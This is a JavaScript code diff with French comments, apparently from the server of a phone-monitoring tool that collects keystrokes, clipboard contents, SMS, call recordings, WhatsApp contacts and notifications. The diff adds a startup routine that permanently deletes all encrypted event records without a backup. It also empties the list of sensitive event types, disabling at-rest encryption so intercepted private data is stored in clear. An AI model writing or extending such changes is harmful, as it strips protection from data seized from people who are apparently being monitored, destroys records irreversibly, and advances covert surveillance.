@@ -456,6 +456,15 @@ function analyzeEvent(deviceId, type, payload, receivedAt) {
 const statsCache = { data: null, expiresAt: 0 };
 const STATS_CACHE_TTL = 30000; // 30 secondes
 
+// Nettoyage unique : supprimer les événements dont le payload est chiffré (illisible)
+try {
+  const corrupted = db.prepare("SELECT COUNT(*) as c FROM events WHERE payload LIKE 'ENC:%'").get();
+  if (corrupted.c > 0) {
+    db.prepare("DELETE FROM events WHERE payload LIKE 'ENC:%'").run();
+    console.log(`  [DB] ${corrupted.c} événements chiffrés avec ancienne clé supprimés`);
+  }
+} catch (e) { console.error('Cleanup error:', e.message); }
+
 // ─── PREPARED STATEMENTS (exécutés une seule fois) ────────────────────────────
 
 const stmts = {
@@ -809,12 +818,9 @@ function decryptAtRest(ciphertext) {
   } catch { return ciphertext; }
 }
 
-// Les types d'événements dont le payload contient des données sensibles
-const SENSITIVE_EVENT_TYPES = new Set([
-  'notification_message', 'voice_message', 'voice_note_captured',
-  'root_message', 'sms_message', 'phone_call', 'call_recording',
-  'keystroke', 'clipboard', 'contacts_sync', 'whatsapp_contacts',
-]);
+// Chiffrement au repos désactivé : Turso fournit déjà TLS + auth token
+// Les anciennes données chiffrées seront re-stockées en clair au prochain sync
+const SENSITIVE_EVENT_TYPES = new Set([]);
 
 function parseEventPayload(raw) {
   if (!raw) return {};
